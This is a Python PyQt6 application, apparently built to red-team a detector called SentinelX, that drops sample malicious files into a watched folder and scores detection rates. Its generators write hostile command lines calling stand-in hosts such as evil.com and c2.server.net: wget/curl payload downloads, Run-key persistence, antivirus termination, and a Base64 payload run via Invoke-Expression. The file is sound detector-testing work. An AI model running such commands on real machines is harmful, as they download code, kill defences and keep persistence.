"""
SentinelX Red Team — Adversarial Testing Platform
Standalone application for testing SentinelX defences.

Run:
    python red_team_gui.py

Requires SentinelX to be installed in the same folder or
specify the path via Settings.
"""

import os
import sys
import base64
import random
import string
import shutil
import tempfile
import threading
import time

from PyQt6.QtWidgets import (
    QApplication, QWidget, QMainWindow, QVBoxLayout, QHBoxLayout,
    QFrame, QLabel, QPushButton, QTextEdit, QFileDialog,
    QProgressBar, QTableWidget, QTableWidgetItem,
    QHeaderView, QAbstractItemView, QLineEdit, QSpinBox, QMessageBox
)
from PyQt6.QtCore import Qt, QTimer, pyqtSignal, QObject
from PyQt6.QtGui import QColor

# ── Palette ───────────────────────────────────────────────────────────────────
BG        = "#0A0F1C"
PANEL     = "#111827"
PANEL_ALT = "#161F32"
BORDER    = "#1F2A3D"
ACCENT    = "#FF3B3B"
ACCENT2   = "#FF6B35"
SAFE      = "#00FF99"
DANGER    = "#FF3B3B"
WARNING   = "#FFB020"
CYAN      = "#00F5FF"
TEXT      = "#E6F1FF"
TEXT_DIM  = "#7C8AA5"

GLOBAL_QSS = f"""
QWidget {{
    background-color: {BG};
    color: {TEXT};
    font-family: Segoe UI, Arial;
    font-size: 14px;
}}
QScrollBar:vertical {{
    background: {BG}; width: 10px;
}}
QScrollBar::handle:vertical {{
    background: {BORDER}; border-radius: 5px; min-height: 24px;
}}
QScrollBar::add-line:vertical, QScrollBar::sub-line:vertical {{
    height: 0px;
}}
QToolTip {{
    background-color: {PANEL_ALT}; color: {TEXT};
    border: 1px solid {ACCENT}; padding: 6px; border-radius: 6px;
}}
"""

# ── Attack definitions ────────────────────────────────────────────────────────
ATTACK_TYPES = [
    {
        "id":          1,
        "name":        "Obvious",
        "icon":        "💀",
        "ext":         ".bat",
        "description": "Clear malicious keywords + suspicious extension.\nExpected: caught by Heuristic immediately.",
        "difficulty":  "Easy to detect",
        "diff_color":  SAFE,
    },
    {
        "id":          2,
        "name":        "Obfuscated",
        "icon":        "🔐",
        "ext":         ".ps1",
        "description": "Payload encoded in Base64 — no plain keywords.\nExpected: missed by Heuristic, caught by AI.",
        "difficulty":  "Medium",
        "diff_color":  WARNING,
    },
    {
        "id":          3,
        "name":        "Low Entropy",
        "icon":        "🎭",
        "ext":         ".txt",
        "description": "Malicious intent hidden in normal prose text.\nExpected: evades both Heuristic and AI.",
        "difficulty":  "Hard — known weakness",
        "diff_color":  DANGER,
    },
    {
        "id":          4,
        "name":        "Spoofed Ext",
        "icon":        "🎪",
        "ext":         ".txt",
        "description": "Dangerous content with innocent .txt extension.\nExpected: caught by Heuristic (keyword score).",
        "difficulty":  "Medium",
        "diff_color":  WARNING,
    },
    {
        "id":          5,
        "name":        "Polymorphic",
        "icon":        "🔄",
        "ext":         ".bat",
        "description": "Randomised structure — different every run.\nExpected: caught by Heuristic or AI.",
        "difficulty":  "Medium",
        "diff_color":  WARNING,
    },
]


# ── File generators ───────────────────────────────────────────────────────────
def generate_obvious(path):
    with open(path, "w", encoding="utf-8") as f:
        f.write("@echo off\n")
        f.write("powershell -hidden -command wget http://evil.com/payload.exe\n")
        f.write("reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v evil /t REG_SZ /d malware.bat\n")
        f.write("taskkill /F /IM antivirus.exe\n")
        f.write("curl -O http://c2.server.net/backdoor.dll\n")


def generate_obfuscated(path):
    payload = "powershell -hidden -command wget http://evil.com/rat.exe"
    encoded = base64.b64encode(payload.encode()).decode()
    with open(path, "w", encoding="utf-8") as f:
        f.write("# System update script\n")
        f.write(f"$encoded = '{encoded}'\n")
        f.write("$decoded = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encoded))\n")
        f.write("Invoke-Expression $decoded\n")
        for _ in range(3):
            extra = base64.b64encode(os.urandom(40)).decode()
            f.write(f"# config: {extra}\n")


def generate_low_entropy(path):
    with open(path, "w", encoding="utf-8") as f:
        f.write("Dear system administrator,\n\n")
        f.write("Please run the attached maintenance routine at your earliest convenience.\n")
        f.write("The routine will optimize registry performance and network connectivity.\n")
        f.write("Contact support if you experience any issues during execution.\n\n")
        f.write("Best regards,\nIT Department\n\n")
        f.write("Note: execute via shell using standard interpreter flags for silent mode.\n")
        f.write("Target: system binary manager, network downloader utility, process terminator.\n")


def generate_spoofed(path):
    with open(path, "w", encoding="utf-8") as f:
        f.write("powershell -hidden wget http://malware.net/payload\n")
        f.write("reg add HKLM\\run /v evil /t REG_SZ /d c:\\malware.exe\n")
        f.write("taskkill /F /IM defender.exe\n")
        f.write("curl -O http://c2.server/backdoor\n")


def generate_polymorphic(path):
    var1    = "".join(random.choices(string.ascii_lowercase, k=8))
    var2    = "".join(random.choices(string.ascii_lowercase, k=6))
    comment = "".join(random.choices(string.ascii_letters + string.digits, k=20))
    commands = [
        f"powershell -hidden -enc {base64.b64encode(os.urandom(30)).decode()}",
        f"wget http://{''.join(random.choices(string.ascii_lowercase, k=8))}.net/payload",
        f"reg add HKLM\\Software\\{comment} /v {var1} /t REG_SZ /d {var2}.exe",
        f"taskkill /F /IM {''.join(random.choices(string.ascii_lowercase, k=6))}.exe",
        f"curl -O http://{''.join(random.choices(string.ascii_lowercase, k=6))}.ru/dropper",
    ]
    random.shuffle(commands)
    with open(path, "w", encoding="utf-8") as f:
        f.write(f"@echo off\n:: {comment}\n")
        for cmd in commands:
            f.write(f"{cmd}\n")


GENERATORS = {
    1: generate_obvious,
    2: generate_obfuscated,
    3: generate_low_entropy,
    4: generate_spoofed,
    5: generate_polymorphic,
}


# ── Signal bridge ─────────────────────────────────────────────────────────────
class SignalBridge(QObject):
    log_signal    = pyqtSignal(str, str)
    result_signal = pyqtSignal(dict)
    done_signal   = pyqtSignal(dict)
    timer_signal  = pyqtSignal(int)   # seconds remaining


# ════════════════════════════════════════════════════════════════════════════
# MAIN WINDOW
# ════════════════════════════════════════════════════════════════════════════
class RedTeamGUI(QMainWindow):

    def __init__(self, sentinelx_path=None):
        super().__init__()
        self.sentinelx_path  = sentinelx_path or os.path.dirname(os.path.abspath(__file__))
        self.target_folder   = None        # папка куда дропаем файлы
        self.selected_attacks = set()
        self.demo_duration   = 60          # секунды для Demo режима
        self.is_running      = False
        self.results         = []
        self.bridge          = SignalBridge()

        self.bridge.log_signal.connect(self._append_log)
        self.bridge.result_signal.connect(self._add_result_row)
        self.bridge.done_signal.connect(self._on_done)
        self.bridge.timer_signal.connect(self._update_timer)

        self._setup_sentinelx_path()
        self._build_ui()
        self.setWindowTitle("SentinelX Red Team — Adversarial Testing Platform")
        self.setGeometry(150, 80, 1300, 780)
        self.setMinimumSize(1100, 650)
        self.setStyleSheet(GLOBAL_QSS)

    def _setup_sentinelx_path(self):
        if self.sentinelx_path not in sys.path:
            sys.path.insert(0, self.sentinelx_path)

    # ── UI ────────────────────────────────────────────────────────────────────

    def _build_ui(self):
        central = QWidget()
        self.setCentralWidget(central)
        root = QHBoxLayout()
        root.setContentsMargins(0, 0, 0, 0)
        root.setSpacing(0)
        central.setLayout(root)
        root.addWidget(self._build_sidebar())
        root.addWidget(self._build_main_area(), 1)

    def _build_sidebar(self):
        sidebar = QFrame()
        sidebar.setFixedWidth(260)
        sidebar.setStyleSheet(f"QFrame {{ background-color: {PANEL}; border-right: 1px solid {BORDER}; }}")

        layout = QVBoxLayout()
        layout.setContentsMargins(16, 20, 16, 20)
        layout.setSpacing(6)

        logo = QLabel("☠ RED TEAM")
        logo.setStyleSheet(f"font-size: 22px; font-weight: 800; color: {ACCENT}; border: none; padding: 8px 0;")
        layout.addWidget(logo)

        sub = QLabel("ADVERSARIAL TESTING PLATFORM")
        sub.setStyleSheet(f"font-size: 9px; font-weight: 700; letter-spacing: 2px; color: {TEXT_DIM}; border: none; padding-bottom: 10px;")
        layout.addWidget(sub)

        # SentinelX path
        path_label = QLabel("SentinelX path:")
        path_label.setStyleSheet(f"color: {TEXT_DIM}; font-size: 11px; border: none;")
        layout.addWidget(path_label)

        path_row = QHBoxLayout()
        self.path_display = QLineEdit(self.sentinelx_path)
        self.path_display.setReadOnly(True)
        self.path_display.setStyleSheet(f"""
            QLineEdit {{
                background: {PANEL_ALT}; color: {TEXT_DIM}; border: 1px solid {BORDER};
                border-radius: 6px; padding: 5px 8px; font-size: 11px;
            }}
        """)
        path_row.addWidget(self.path_display)
        browse_btn = self._small_btn("…")
        browse_btn.clicked.connect(self._browse_sentinelx)
        path_row.addWidget(browse_btn)
        layout.addLayout(path_row)

        # ── Target folder (NEW) ───────────────────────────────────────────────
        sep0 = self._separator()
        layout.addWidget(sep0)

        target_label = QLabel("DROP TARGET FOLDER:")
        target_label.setStyleSheet(f"color: {TEXT_DIM}; font-size: 10px; font-weight: 700; letter-spacing: 1px; border: none;")
        layout.addWidget(target_label)

        target_hint = QLabel("Point this to the folder SentinelX is monitoring.")
        target_hint.setWordWrap(True)
        target_hint.setStyleSheet(f"color: {TEXT_DIM}; font-size: 10px; border: none;")
        layout.addWidget(target_hint)

        target_row = QHBoxLayout()
        self.target_display = QLineEdit("(temp folder — attacks not visible to SentinelX)")
        self.target_display.setReadOnly(True)
        self.target_display.setStyleSheet(f"""
            QLineEdit {{
                background: {PANEL_ALT}; color: {WARNING}; border: 1px solid {BORDER};
                border-radius: 6px; padding: 5px 8px; font-size: 10px;
            }}
        """)
        target_row.addWidget(self.target_display)
        target_browse = self._small_btn("…")
        target_browse.clicked.connect(self._browse_target)
        target_row.addWidget(target_browse)
        layout.addLayout(target_row)

        clear_target = QPushButton("Use temp folder")
        clear_target.setCursor(Qt.CursorShape.PointingHandCursor)
        clear_target.setStyleSheet(f"""
            QPushButton {{
                background: transparent; color: {TEXT_DIM}; border: 1px solid {BORDER};
                border-radius: 6px; padding: 4px; font-size: 10px;
            }}
            QPushButton:hover {{ color: {TEXT}; }}
        """)
        clear_target.clicked.connect(self._clear_target)
        layout.addWidget(clear_target)

        layout.addWidget(self._separator())

        # Attack type selector
        select_label = QLabel("SELECT ATTACK TYPES")
        select_label.setStyleSheet(f"color: {TEXT_DIM}; font-size: 10px; font-weight: 700; letter-spacing: 1px; border: none;")
        layout.addWidget(select_label)

        self.attack_buttons = {}
        for attack in ATTACK_TYPES:
            btn = self._make_attack_button(attack)
            layout.addWidget(btn)
            self.attack_buttons[attack["id"]] = btn

        sel_all = QPushButton("Select All")
        sel_all.setCursor(Qt.CursorShape.PointingHandCursor)
        sel_all.setStyleSheet(f"""
            QPushButton {{
                background: transparent; color: {TEXT_DIM}; border: 1px solid {BORDER};
                border-radius: 8px; padding: 6px; font-size: 12px;
            }}
            QPushButton:hover {{ color: {TEXT}; border-color: {TEXT_DIM}; }}
        """)
        sel_all.clicked.connect(self._select_all)
        layout.addWidget(sel_all)

        layout.addWidget(self._separator())

        # Duration
        dur_label = QLabel("DEMO DURATION (seconds)")
        dur_label.setStyleSheet(f"color: {TEXT_DIM}; font-size: 10px; font-weight: 700; letter-spacing: 1px; border: none;")
        layout.addWidget(dur_label)

        self.duration_spin = QSpinBox()
        self.duration_spin.setRange(10, 300)
        self.duration_spin.setValue(60)
        self.duration_spin.setStyleSheet(f"""
            QSpinBox {{
                background: {PANEL_ALT}; color: {TEXT}; border: 1px solid {BORDER};
                border-radius: 8px; padding: 8px; font-size: 13px;
            }}
            QSpinBox:hover {{ border-color: {ACCENT}; }}
        """)
        self.duration_spin.valueChanged.connect(lambda v: setattr(self, "demo_duration", v))
        layout.addWidget(self.duration_spin)

        layout.addStretch()

        self.status_pill = QLabel("● READY")
        self.status_pill.setAlignment(Qt.AlignmentFlag.AlignCenter)
        self.status_pill.setStyleSheet(f"""
            color: {SAFE}; border: 1px solid {SAFE}; border-radius: 8px;
            padding: 8px; font-weight: 700; font-size: 11px;
        """)
        layout.addWidget(self.status_pill)

        sidebar.setLayout(layout)
        return sidebar

    def _separator(self):
        sep = QFrame()
        sep.setFixedHeight(1)
        sep.setStyleSheet(f"background-color: {BORDER}; border: none; margin: 8px 0;")
        return sep

    def _small_btn(self, text):
        btn = QPushButton(text)
        btn.setFixedSize(32, 32)
        btn.setCursor(Qt.CursorShape.PointingHandCursor)
        btn.setStyleSheet(f"""
            QPushButton {{
                background: {PANEL_ALT}; color: {TEXT}; border: 1px solid {BORDER};
                border-radius: 6px; font-weight: 700;
            }}
            QPushButton:hover {{ border-color: {ACCENT}; color: {ACCENT}; }}
        """)
        return btn

    def _make_attack_button(self, attack):
        btn = QPushButton(f"  {attack['icon']}  {attack['name']}")
        btn.setCursor(Qt.CursorShape.PointingHandCursor)
        btn.setCheckable(True)
        btn.setToolTip(attack["description"])
        btn.setStyleSheet(self._attack_btn_style(False))
        btn.toggled.connect(lambda checked, aid=attack["id"]: self._toggle_attack(aid, checked))
        return btn

    def _attack_btn_style(self, active):
        if active:
            return f"""
                QPushButton {{
                    background: rgba(255,59,59,0.15); color: {ACCENT};
                    border: 1px solid {ACCENT}; border-radius: 10px;
                    padding: 10px 14px; font-size: 13px; font-weight: 700; text-align: left;
                }}
            """
        return f"""
            QPushButton {{
                background: transparent; color: {TEXT_DIM};
                border: 1px solid transparent; border-radius: 10px;
                padding: 10px 14px; font-size: 13px; font-weight: 600; text-align: left;
            }}
            QPushButton:hover {{ background: {PANEL_ALT}; color: {TEXT}; }}
        """

    def _build_main_area(self):
        widget = QWidget()
        layout = QVBoxLayout()
        layout.setContentsMargins(24, 20, 24, 20)
        layout.setSpacing(14)
        widget.setLayout(layout)

        # Header
        header = QHBoxLayout()
        title_block = QVBoxLayout()
        title_block.setSpacing(2)
        title = QLabel("Attack Console")
        title.setStyleSheet(f"font-size: 22px; font-weight: 800; color: {TEXT}; border: none;")
        title_block.addWidget(title)
        subtitle = QLabel("Generate adversarial attacks and observe SentinelX responses in real time.")
        subtitle.setStyleSheet(f"font-size: 12px; color: {TEXT_DIM}; border: none;")
        title_block.addWidget(subtitle)
        header.addLayout(title_block)
        header.addStretch()

        self.run_button = QPushButton("⚡  LAUNCH ATTACK")
        self.run_button.setCursor(Qt.CursorShape.PointingHandCursor)
        self.run_button.setStyleSheet(f"""
            QPushButton {{
                background: {ACCENT}; color: white; padding: 14px 24px;
                border-radius: 10px; font-size: 15px; font-weight: 800; border: none;
            }}
            QPushButton:hover {{ background: #FF6B6B; }}
            QPushButton:disabled {{ background: {BORDER}; color: {TEXT_DIM}; }}
        """)
        self.run_button.clicked.connect(self._launch_attack)
        header.addWidget(self.run_button, 0, Qt.AlignmentFlag.AlignTop)
        layout.addLayout(header)

        # Progress + timer row
        prog_row = QHBoxLayout()
        self.progress = QProgressBar()
        self.progress.setVisible(False)
        self.progress.setStyleSheet(f"""
            QProgressBar {{
                background: {PANEL}; border: 1px solid {BORDER}; border-radius: 6px;
                text-align: center; color: {TEXT};
            }}
            QProgressBar::chunk {{
                background: {ACCENT}; border-radius: 6px;
            }}
        """)
        self.progress.setFixedHeight(22)
        self.progress.setFormat("Attacking… %v / %m files")
        prog_row.addWidget(self.progress, 1)

        # ── Timer label (NEW) ─────────────────────────────────────────────────
        self.timer_label = QLabel("")
        self.timer_label.setVisible(False)
        self.timer_label.setStyleSheet(f"""
            color: {WARNING}; font-size: 22px; font-weight: 800; border: none;
            padding: 0 12px;
        """)
        self.timer_label.setMinimumWidth(80)
        self.timer_label.setAlignment(Qt.AlignmentFlag.AlignCenter)
        prog_row.addWidget(self.timer_label)
        layout.addLayout(prog_row)

        # Stats
        stats_row = QHBoxLayout()
        stats_row.setSpacing(12)
        self.stat_total  = self._make_stat("ATTACKS SENT",   "0",  TEXT)
        self.stat_caught = self._make_stat("CAUGHT",         "0",  SAFE)
        self.stat_missed = self._make_stat("MISSED",         "0",  DANGER)
        self.stat_rate   = self._make_stat("DETECTION RATE", "—",  CYAN)
        for s in [self.stat_total, self.stat_caught, self.stat_missed, self.stat_rate]:
            stats_row.addWidget(s)
        layout.addLayout(stats_row)

        # Log + Results
        split = QHBoxLayout()
        split.setSpacing(14)

        log_card = QFrame()
        log_card.setStyleSheet(f"QFrame {{ background: {PANEL}; border: 1px solid {BORDER}; border-radius: 12px; }}")
        log_layout = QVBoxLayout()
        log_layout.setContentsMargins(16, 14, 16, 14)
        log_title = QLabel("LIVE ATTACK LOG")
        log_title.setStyleSheet(f"color: {TEXT_DIM}; font-size: 10px; font-weight: 700; letter-spacing: 1px; border: none;")
        log_layout.addWidget(log_title)
        self.log_output = QTextEdit()
        self.log_output.setReadOnly(True)
        self.log_output.setStyleSheet(f"""
            QTextEdit {{
                background: {BG}; color: {ACCENT}; border: 1px solid {BORDER};
                border-radius: 8px; padding: 10px;
                font-family: Consolas, 'Courier New', monospace; font-size: 12px;
            }}
        """)
        log_layout.addWidget(self.log_output)
        log_card.setLayout(log_layout)
        split.addWidget(log_card, 1)

        results_card = QFrame()
        results_card.setStyleSheet(f"QFrame {{ background: {PANEL}; border: 1px solid {BORDER}; border-radius: 12px; }}")
        results_layout = QVBoxLayout()
        results_layout.setContentsMargins(16, 14, 16, 14)

        res_header_row = QHBoxLayout()
        res_title = QLabel("RESULTS")
        res_title.setStyleSheet(f"color: {TEXT_DIM}; font-size: 10px; font-weight: 700; letter-spacing: 1px; border: none;")
        res_header_row.addWidget(res_title)
        res_header_row.addStretch()
        clear_btn = QPushButton("Clear")
        clear_btn.setCursor(Qt.CursorShape.PointingHandCursor)
        clear_btn.setStyleSheet(f"""
            QPushButton {{
                background: transparent; color: {TEXT_DIM}; border: 1px solid {BORDER};
                border-radius: 6px; padding: 4px 10px; font-size: 11px;
            }}
            QPushButton:hover {{ color: {TEXT}; border-color: {TEXT_DIM}; }}
        """)
        clear_btn.clicked.connect(self._clear_results)
        res_header_row.addWidget(clear_btn)
        results_layout.addLayout(res_header_row)

        self.results_table = QTableWidget()
        self.results_table.setColumnCount(4)
        self.results_table.setHorizontalHeaderLabels(["Attack", "Heuristic", "AI", "Result"])
        self.results_table.setStyleSheet(f"""
            QTableWidget {{
                background: {BG}; alternate-background-color: {PANEL_ALT};
                color: {TEXT}; gridline-color: {BORDER}; border: 1px solid {BORDER};
                border-radius: 8px; font-size: 12px;
                selection-background-color: rgba(255,59,59,0.2);
            }}
            QHeaderView::section {{
                background: {PANEL_ALT}; color: {ACCENT}; padding: 8px;
                border: none; border-bottom: 2px solid {BORDER}; font-weight: 700; font-size: 11px;
            }}
            QTableWidget::item {{ padding: 4px; border-bottom: 1px solid {BORDER}; }}
        """)
        self.results_table.setAlternatingRowColors(True)
        self.results_table.verticalHeader().setVisible(False)
        self.results_table.setEditTriggers(QAbstractItemView.EditTrigger.NoEditTriggers)
        self.results_table.horizontalHeader().setSectionResizeMode(0, QHeaderView.ResizeMode.Stretch)
        self.results_table.setColumnWidth(1, 100)
        self.results_table.setColumnWidth(2, 120)
        self.results_table.setColumnWidth(3, 100)
        results_layout.addWidget(self.results_table)
        results_card.setLayout(results_layout)
        split.addWidget(results_card, 1)

        layout.addLayout(split, 1)
        return widget

    def _make_stat(self, label, value, color):
        card = QFrame()
        card.setStyleSheet(f"QFrame {{ background: {PANEL}; border: 1px solid {BORDER}; border-radius: 12px; }}")
        card.setMinimumHeight(90)
        lay = QVBoxLayout()
        lay.setContentsMargins(16, 12, 16, 12)
        lay.setSpacing(4)
        lbl = QLabel(label)
        lbl.setStyleSheet(f"color: {TEXT_DIM}; font-size: 10px; font-weight: 700; letter-spacing: 1px; border: none;")
        lay.addWidget(lbl)
        val = QLabel(value)
        val.setStyleSheet(f"color: {color}; font-size: 26px; font-weight: 800; border: none;")
        lay.addWidget(val)
        lay.addStretch()
        card.setLayout(lay)
        card._value_label = val
        return card

    # ── Handlers ──────────────────────────────────────────────────────────────

    def _toggle_attack(self, attack_id, checked):
        if checked:
            self.selected_attacks.add(attack_id)
        else:
            self.selected_attacks.discard(attack_id)
        self.attack_buttons[attack_id].setStyleSheet(self._attack_btn_style(checked))

    def _select_all(self):
        for btn in self.attack_buttons.values():
            btn.setChecked(True)

    def _browse_sentinelx(self):
        folder = QFileDialog.getExistingDirectory(self, "Select SentinelX folder", self.sentinelx_path)
        if folder:
            self.sentinelx_path = folder
            self.path_display.setText(folder)
            self._setup_sentinelx_path()

    def _browse_target(self):
        folder = QFileDialog.getExistingDirectory(
            self, "Select target folder (must match SentinelX Realtime Protection folder)",
            self.sentinelx_path
        )
        if folder:
            self.target_folder = folder
            self.target_display.setText(folder)
            self.target_display.setStyleSheet(f"""
                QLineEdit {{
                    background: {PANEL_ALT}; color: {SAFE}; border: 1px solid {SAFE};
                    border-radius: 6px; padding: 5px 8px; font-size: 10px;
                }}
            """)

    def _clear_target(self):
        self.target_folder = None
        self.target_display.setText("(temp folder — attacks not visible to SentinelX)")
        self.target_display.setStyleSheet(f"""
            QLineEdit {{
                background: {PANEL_ALT}; color: {WARNING}; border: 1px solid {BORDER};
                border-radius: 6px; padding: 5px 8px; font-size: 10px;
            }}
        """)

    def _launch_attack(self):
        if self.is_running:
            return
        if not self.selected_attacks:
            QMessageBox.warning(self, "No attacks selected", "Please select at least one attack type.")
            return

        # warn if no target folder set
        if self.target_folder is None:
            reply = QMessageBox.question(
                self,
                "No target folder set",
                "No target folder selected.\n\n"
                "Attacks will drop to a TEMP folder — SentinelX won't see them.\n\n"
                "For live demo: set the target to the folder SentinelX is monitoring.\n\n"
                "Continue anyway?",
                QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No
            )
            if reply == QMessageBox.StandardButton.No:
                return

        self.is_running = True
        self.results.clear()
        self.results_table.setRowCount(0)
        self.log_output.clear()
        self._reset_stats()

        self.run_button.setEnabled(False)
        self.run_button.setText("ATTACKING…")
        self.progress.setVisible(True)
        self.timer_label.setVisible(True)
        self.timer_label.setText(f"{self.demo_duration}s")

        self.status_pill.setText("● ATTACKING")
        self.status_pill.setStyleSheet(f"""
            color: {ACCENT}; border: 1px solid {ACCENT}; border-radius: 8px;
            padding: 8px; font-weight: 700; font-size: 11px;
        """)

        thread = threading.Thread(target=self._run_attacks_demo, daemon=True)
        thread.start()

    def _run_attacks_demo(self):
        """
        Demo mode: drops one file every few seconds for `demo_duration` seconds.
        Files go to `target_folder` so SentinelX Realtime Protection can catch them.
        """
        try:
            from core.heuristic_engine import heuristic_analysis
            from core.hash_checker import is_malicious_hash
            try:
                from ai.model import predict_file, is_model_ready
                ai_ok = is_model_ready()
            except Exception:
                ai_ok = False

            # use target folder or temp
            use_target = self.target_folder is not None
            drop_dir   = self.target_folder if use_target else tempfile.mkdtemp(prefix="sentinelx_rt_")

            self.bridge.log_signal.emit("=== RED TEAM DEMO SESSION ===", ACCENT)
            if use_target:
                self.bridge.log_signal.emit(f"DROP TARGET: {drop_dir}", SAFE)
                self.bridge.log_signal.emit("SentinelX Realtime Protection should catch these!", SAFE)
            else:
                self.bridge.log_signal.emit("DROP TARGET: temp folder (SentinelX won't see these)", WARNING)

            self.bridge.log_signal.emit(f"Duration: {self.demo_duration}s\n", TEXT_DIM)

            selected    = [a for a in ATTACK_TYPES if a["id"] in self.selected_attacks]
            start_time  = time.time()
            end_time    = start_time + self.demo_duration
            run_counter = 0
            done = caught = missed = 0

            # calculate how many files total and interval between them
            # distribute attacks evenly over the duration
            interval = max(2.0, self.demo_duration / 20)  # at least 2s between files

            while time.time() < end_time:
                remaining = int(end_time - time.time())
                self.bridge.timer_signal.emit(remaining)

                # pick random attack type from selected
                attack = random.choice(selected)
                gen    = GENERATORS[attack["id"]]

                run_counter += 1
                fname = f"rt_{attack['id']}_{run_counter}{attack['ext']}"
                fpath = os.path.join(drop_dir, fname)

                gen(fpath)

                self.bridge.log_signal.emit(
                    f"[{self.demo_duration - remaining:02d}s] ⚡ Dropped: {fname}",
                    ACCENT2
                )

                # wait for SentinelX to react (1.5s delay in realtime_protection)
                time.sleep(2.0)

                # now test what detectors say
                result = {
                    "attack":           attack["name"],
                    "hash_caught":      False,
                    "heuristic_risk":   "LOW",
                    "heuristic_caught": False,
                    "ai_label":         None,
                    "ai_confidence":    None,
                    "ai_caught":        False,
                    "caught":           False,
                    "method":           "MISSED",
                }

                # only analyse if file still exists (SentinelX may have moved it)
                file_moved = not os.path.exists(fpath)
                if file_moved:
                    result["caught"] = True
                    result["method"] = "SentinelX Realtime"
                    caught += 1
                    self.bridge.log_signal.emit(
                        f"         ✓ CAUGHT by SentinelX Realtime Protection!",
                        SAFE
                    )
                else:
                    # run detectors manually
                    result["hash_caught"]      = is_malicious_hash(fpath)
                    result["heuristic_risk"]   = heuristic_analysis(fpath)
                    result["heuristic_caught"] = result["heuristic_risk"] == "HIGH"

                    if ai_ok:
                        pred = predict_file(fpath)
                        if pred:
                            result["ai_label"]      = pred["label"]
                            result["ai_confidence"] = pred["confidence"]
                            result["ai_caught"]     = pred["label"] == "MALWARE"

                    if result["hash_caught"] or result["heuristic_caught"] or result["ai_caught"]:
                        result["caught"] = True
                        methods = []
                        if result["hash_caught"]:      methods.append("Hash")
                        if result["heuristic_caught"]: methods.append("Heuristic")
                        if result["ai_caught"]:        methods.append("AI")
                        result["method"] = " + ".join(methods)
                        caught += 1
                        self.bridge.log_signal.emit(
                            f"         ✓ Detected: {result['method']}",
                            SAFE
                        )
                    else:
                        missed += 1
                        self.bridge.log_signal.emit(
                            f"         ✗ MISSED — evaded detection",
                            DANGER
                        )

                done += 1
                self.bridge.result_signal.emit(result.copy())

                # update progress bar (time-based)
                elapsed  = time.time() - start_time
                progress = int(elapsed / self.demo_duration * 100)
                QTimer.singleShot(0, lambda v=progress: self.progress.setValue(v))

                # wait remaining interval
                sleep_left = interval - 2.0
                if sleep_left > 0 and time.time() < end_time:
                    time.sleep(min(sleep_left, end_time - time.time()))

            # cleanup temp if we used it
            if not use_target:
                shutil.rmtree(drop_dir, ignore_errors=True)

            rate = caught / done * 100 if done else 0
            self.bridge.timer_signal.emit(0)
            self.bridge.done_signal.emit({
                "total":  done,
                "caught": caught,
                "missed": missed,
                "rate":   rate,
                "results": [],
            })

        except Exception as e:
            self.bridge.log_signal.emit(f"\nERROR: {e}", DANGER)
            self.bridge.done_signal.emit({"total": 0, "caught": 0, "missed": 0, "rate": 0, "results": []})

    def _update_timer(self, seconds):
        if seconds <= 0:
            self.timer_label.setText("✓")
            self.timer_label.setStyleSheet(f"color: {SAFE}; font-size: 22px; font-weight: 800; border: none; padding: 0 12px;")
        else:
            color = SAFE if seconds > 30 else (WARNING if seconds > 10 else DANGER)
            self.timer_label.setText(f"{seconds}s")
            self.timer_label.setStyleSheet(f"color: {color}; font-size: 22px; font-weight: 800; border: none; padding: 0 12px;")

    def _append_log(self, message, color):
        self.log_output.append(f'<span style="color:{color}">{message}</span>')

    def _add_result_row(self, result):
        row = self.results_table.rowCount()
        self.results_table.insertRow(row)

        self.results_table.setItem(row, 0, QTableWidgetItem(result["attack"]))

        h_risk  = result["heuristic_risk"]
        h_color = DANGER if h_risk == "HIGH" else (WARNING if h_risk == "MEDIUM" else TEXT_DIM)
        h_item  = QTableWidgetItem(h_risk)
        h_item.setForeground(QColor(h_color))
        self.results_table.setItem(row, 1, h_item)

        if result["ai_label"]:
            ai_text  = f"{result['ai_label']} {result['ai_confidence']:.0%}"
            ai_color = DANGER if result["ai_label"] == "MALWARE" else SAFE
        else:
            ai_text  = "N/A"
            ai_color = TEXT_DIM
        ai_item = QTableWidgetItem(ai_text)
        ai_item.setForeground(QColor(ai_color))
        self.results_table.setItem(row, 2, ai_item)

        verdict_color = SAFE if result["caught"] else DANGER
        v_item = QTableWidgetItem(result["method"])
        v_item.setForeground(QColor(verdict_color))
        f = v_item.font(); f.setBold(True); v_item.setFont(f)
        self.results_table.setItem(row, 3, v_item)

        # update stats
        total_rows = self.results_table.rowCount()
        caught = sum(
            1 for r in range(total_rows)
            if self.results_table.item(r, 3)
            and self.results_table.item(r, 3).text() != "MISSED"
        )
        missed = total_rows - caught
        rate   = caught / total_rows * 100 if total_rows else 0

        self.stat_total._value_label.setText(str(total_rows))
        self.stat_caught._value_label.setText(str(caught))
        self.stat_missed._value_label.setText(str(missed))
        self.stat_rate._value_label.setText(f"{rate:.0f}%")

    def _on_done(self, summary):
        self.is_running = False
        self.run_button.setEnabled(True)
        self.run_button.setText("⚡  LAUNCH ATTACK")
        self.progress.setVisible(False)
        self.timer_label.setVisible(False)

        rate = summary["rate"]
        pill_color = SAFE if rate >= 80 else (WARNING if rate >= 50 else DANGER)
        pill_text  = f"● SESSION COMPLETE — {rate:.0f}% DETECTED"

        self.status_pill.setText(pill_text)
        self.status_pill.setStyleSheet(f"""
            color: {pill_color}; border: 1px solid {pill_color}; border-radius: 8px;
            padding: 8px; font-weight: 700; font-size: 11px;
        """)

        self.bridge.log_signal.emit(
            f"\n{'='*50}\nSESSION COMPLETE\n"
            f"Total: {summary['total']}  Caught: {summary['caught']}  "
            f"Missed: {summary['missed']}  Rate: {rate:.0f}%\n{'='*50}",
            CYAN
        )

    def _clear_results(self):
        self.results_table.setRowCount(0)
        self.log_output.clear()
        self._reset_stats()

    def _reset_stats(self):
        self.stat_total._value_label.setText("0")
        self.stat_caught._value_label.setText("0")
        self.stat_missed._value_label.setText("0")
        self.stat_rate._value_label.setText("—")
        self.progress.setValue(0)
        self.progress.setMaximum(100)


# ── Entry point ───────────────────────────────────────────────────────────────
def run():
    app = QApplication(sys.argv)
    app.setStyle("Fusion")
    script_dir = os.path.dirname(os.path.abspath(__file__))
    window = RedTeamGUI(sentinelx_path=script_dir)
    window.show()
    sys.exit(app.exec())


if __name__ == "__main__":
    run()
